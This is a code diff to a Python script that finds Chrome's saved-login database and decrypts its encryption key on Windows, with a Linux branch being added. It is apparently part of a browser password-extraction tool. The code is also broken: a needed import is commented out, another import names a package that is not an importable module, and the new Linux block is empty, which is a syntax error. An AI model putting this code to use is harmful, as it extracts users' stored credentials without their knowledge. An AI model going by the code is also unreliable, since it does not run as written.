@@ -5,7 +5,8 @@ import os
 #import syslog
 import json
 import base64
-import win32crypt
+#import win32crypt
+import pycryptodome
 
 class logger ():
     #def logSysLog(status, action):
@@ -26,18 +27,26 @@ def determinePath():
 
     elif sys.platform == 'linux':
         path = "~/.config/google-chrome/Default/Login Data"
+        #in linux we must use expanduser to use the ~ in Python
+        path = os.path.expanduser(path)
         return path
 
 def getEncryptionKey(path):
-    with open(path, "r", encoding="utf-8") as f:
-        data = json.loads(f.read())
-
-    #fetch key from data store based on path
-    key = base64.b64decode(data["os_crypt"]["encrypted_key"])
-    key = key[5:]
 
     if sys.platform == 'win32':
+            
+        with open(path, "r", encoding="utf-8") as f:
+            data = json.loads(f.read())
+
+        #fetch key from data store based on path
+        key = base64.b64decode(data["os_crypt"]["encrypted_key"])
+        key = key[5:]
+
         return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+    if sys.platform == 'linux':
+        
+   
     else:
         logger.logShell("Failure", "system is not Windows for getEncryptionKey function")
 
